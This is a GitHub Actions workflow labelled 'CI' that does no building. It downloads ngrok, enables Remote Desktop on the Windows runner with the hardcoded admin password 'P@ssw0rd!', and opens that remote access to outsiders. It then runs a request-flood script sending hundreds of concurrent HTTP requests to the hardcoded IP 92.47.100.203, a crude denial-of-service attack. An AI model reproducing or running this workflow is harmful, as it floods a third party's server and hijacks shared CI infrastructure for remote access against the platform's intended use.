name: CI

on:
  push:
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Download
      run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip

    - name: Extract
      run: Expand-Archive ngrok.zip

    - name: Auth
      run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
      env:
        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}

    - name: Enable TS
      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0

    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1

    - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)

    - name: Run Bash Script
      run: |
        # Write Bash script to a file
        echo '#!/bin/bash

        # Install requests library
        pip install requests

        # Create Python script file
        echo \'
        import requests
        import threading

        def send_request():
            url = "http://92.47.100.203"
            try:
                response = requests.get(url)
                print(f"Response from {url}: {response.status_code}")
            except Exception as e:
                print(f"Error sending request to {url}: {e}")

        num_threads = 100
        threads = [threading.Thread(target=send_request) for _ in range(num_threads)]

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()
        \' > script.py

        # Run the script 9 times concurrently
        for i in {1..9}
        do
            python script.py &
        done

        # Wait for all background processes to finish
        wait
        ' > run_script.sh

        # Run the Bash script using Git Bash
        "C:\Program Files\Git\bin\bash.exe" run_script.sh
